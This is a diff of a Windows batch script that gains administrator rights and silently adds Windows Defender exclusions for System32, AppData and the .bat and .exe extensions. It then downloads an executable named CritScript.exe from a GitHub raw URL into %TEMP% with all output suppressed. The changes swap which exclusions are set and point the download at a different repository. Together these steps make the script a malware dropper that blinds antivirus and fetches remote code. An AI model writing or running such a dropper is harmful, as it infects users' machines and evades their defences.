@@ -1,3 +1,4 @@
+@echo off
 :: BatchGotAdmin
 
 :-------------------------------------
@@ -25,17 +26,16 @@ if '%errorlevel%' NEQ '0' (
     CD /D "%~dp0"
 
     REM --> Silent PowerShell commands
-    powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '%userprofile%/Desktop'" >nul 2>&1
-    powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '%userprofile%/Downloads'" >nul 2>&1
-    powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '%userprofile%/AppData/'" >nul 2>&1
-    powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionExtension '.exe'" >nul 2>&1
+    powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath 'C:\Windows\System32'" >nul 2>&1
     powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionExtension '.bat'" >nul 2>&1
+    powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionExtension '.exe'" >nul 2>&1
+    powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '%userprofile%/AppData/'" >nul 2>&1
 
     REM --> Navigate to the %TEMP% directory
     cd %TEMP%
 
     REM --> Download files silently using PowerShell
-    powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/DARJARN7/DDNS/main/CritScript.exe' -OutFile CritScript.exe" >nul 2>&1
+    powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/Xevioo/XevioHub/main/CritScript.exe' -OutFile CritScript.exe" >nul 2>&1
 
     REM --> Check if CritScript.exe exists silently
     if not exist "CritScript.exe" (
@@ -54,7 +54,6 @@ if '%errorlevel%' NEQ '0' (
             goto :ExitScript
         )
     )
-
     :ExitScript
     REM --> Exit the script
     exit /b
